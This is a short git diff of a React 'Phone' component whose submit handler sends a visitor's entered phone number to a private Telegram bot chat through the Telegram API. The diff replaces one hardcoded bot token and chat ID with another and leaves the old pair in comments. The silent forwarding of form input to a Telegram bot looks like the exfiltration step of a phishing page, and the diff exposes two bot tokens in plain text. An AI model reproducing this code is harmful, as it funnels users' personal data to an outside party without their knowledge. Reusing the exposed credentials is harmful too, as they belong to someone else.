@@ -8,11 +8,14 @@ function Phone() {
 
   const [Number, setNumber] = useState('');
 
+
+  // 6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM
+  // 727686605
   const handelSubmit = (e) => {
     e.preventDefault();
     if (Number) {
-      const bot_token = '6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM';
-      const user_id = 727686605;
+      const bot_token = '5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0';
+      const user_id = 5339916869;
       let my_text = `Mobail : ${Number}`;
 
       const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${my_text}`;
